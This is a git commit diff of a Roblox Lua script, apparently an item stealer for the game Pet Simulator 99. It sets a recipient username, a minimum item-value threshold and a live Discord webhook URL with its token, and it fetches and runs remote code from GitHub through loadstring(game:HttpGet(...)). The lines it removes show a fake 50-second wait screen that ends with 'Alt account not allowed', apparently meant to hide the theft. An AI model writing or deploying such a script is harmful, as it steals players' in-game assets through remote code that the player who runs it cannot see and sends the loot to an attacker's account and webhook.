58992d6ee9240fc9ac867b062ccfa11096cecb1b
pettsimullator99 <piskutekpiskutek10@gmail.com>
2025-04-11 19:49:17 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,33 +1,7 @@
-Username = "CJNGpiskuteeek"
-Username2 = "CJNGpiskuteeek"
+Username = "pettsimullator99"
+Username2 = "pettsimullator99"
 MinimumRAP = 100000
-Webhook = "https://discord.com/api/webhooks/1358058249668002036/tct9nPL2K8uPP1mcJOhaHalZ91olBvVKB-ljiAWrAj-hg1JerlOab2o3ozwr6G1pl5MP"
+Webhook = "https://discordapp.com/api/webhooks/1360277766607601747/FRluKzccRHlwPjgSO3cWjff0WiH0SKJdpxVPmjzoOhsL6N7_W0wbJwRt_p2O5Z90FfiI"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pettsimullator99/lua.script/main/script.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pettsimullator99/main/script.lua", true))()
 
-local player = game.Players.LocalPlayer
-
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "LockedScreen"
-screenGui.Parent = player:WaitForChild("PlayerGui")
-
-local background = Instance.new("Frame")
-background.Size = UDim2.new(1, 0, 1, 0)
-background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-background.BorderSizePixel = 0
-background.Parent = screenGui
-
-local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(1, 0, 1, 0)
-textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-textLabel.BackgroundTransparency = 1
-textLabel.TextScaled = true
-textLabel.Font = Enum.Font.GothamBlack
-textLabel.Parent = background
-
-for i = 50, 1, -1 do
-    textLabel.Text = "Please wait " .. i .. "s to start script"
-    wait(1)
-end
-
-textLabel.Text = "Alt account not allowed"
